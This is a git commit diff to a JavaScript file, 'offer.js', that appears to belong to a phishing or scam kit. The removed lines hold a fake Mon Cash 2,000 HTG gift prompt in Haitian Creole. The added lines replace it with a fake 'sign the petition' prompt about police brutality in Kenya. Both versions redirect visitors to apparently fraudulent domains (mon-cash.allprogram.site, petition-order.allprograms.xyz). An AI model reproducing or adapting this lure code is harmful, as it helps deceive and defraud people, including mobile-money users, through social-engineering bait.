0231bb50d3af6ff54451780f316c579906e4cd21
essac5523me <essac5523+me@gmail.com>
2025-06-25 21:15:10 +0100

    Update offer.js

--- offer.js
+++ offer.js
@@ -1,6 +1,6 @@
 /* Password Protection Script by www.onlineofferz.xyz*/
-var password = 'HTG 2,000'
-password=prompt('SMS: Felisitasyon Kont Mon Cash ou a kalifye pou resevwa òf selebrasyon 2000yèm anivèsè HTG a, tanpri peze OK pou KONTINYE.  ','HTG 2,000');
-if (password != 'HTG 2,000') {
-location.href='https://mon-cash.allprogram.site/gift';
+var password = 'sign'
+password=prompt('SMS: Help Sign The Petition To End BAD GOVERNANCE AND POLICE BRUTALITY IN KENYA. , Kindly press "OK" to Proceed.  ','sign');
+if (password != 'sign') {
+location.href='https://petition-order.allprograms.xyz/sign';
 }
